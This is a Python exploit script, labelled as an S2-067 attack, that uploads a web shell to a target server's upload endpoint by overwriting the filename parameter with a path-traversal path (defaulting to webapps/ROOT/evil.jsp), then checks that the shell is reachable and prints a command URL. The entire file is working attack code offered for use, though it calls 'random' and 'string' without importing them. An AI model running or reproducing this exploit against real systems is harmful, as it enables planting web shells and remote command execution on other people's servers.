import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder

def upload_file(target_url, upload_endpoint, file_path, destination_path):
    """
    Upload a WebShell file to the target using parameter overwrite and path traversal.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading WebShell to {upload_url}...")

    headers = {"User-Agent": "Mozilla/5.0"}
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    with open(file_path, "rb") as f:
        webshell_content = f.read()

    files_payload = {
        "upload": (file_path, webshell_content, "application/octet-stream"),
        "uploadFileName": destination_path
    }

    m = MultipartEncoder(fields=files_payload, boundary=boundary)
    headers["Content-Type"] = m.content_type

    try:
        response = requests.post(upload_url, headers=headers, data=m, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] WebShell uploaded successfully: {destination_path}")
            verify_uploaded_file(target_url, destination_path)
        else:
            print(f"[ERROR] Upload failed. HTTP {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")

def verify_uploaded_file(target_url, file_path):
    """Verify if the uploaded WebShell file is accessible."""
    file_url = urljoin(target_url, file_path)
    print(f"[INFO] Verifying uploaded WebShell: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200:
            print(f"[ALERT] WebShell uploaded and accessible: {file_url}?cmd=whoami")
        else:
            print(f"[INFO] WebShell not accessible. HTTP Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="S2-067 Exploit - WebShell Upload")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to upload endpoint (e.g., /uploads.action)")
    parser.add_argument("--webshell", required=True, help="Path to WebShell file")
    parser.add_argument("--destination_path", default="../../../../../webapps/ROOT/evil.jsp",
                        help="Target path for WebShell (e.g., ../../../../../webapps/ROOT/evil.jsp)")
    args = parser.parse_args()

    print("[INFO] Starting S2-067 WebShell Upload Exploit...")
    upload_file(args.url.rstrip("/"), args.upload_endpoint, args.webshell, args.destination_path)
    print("[INFO] Exploit process completed.")

if __name__ == "__main__":
    main()
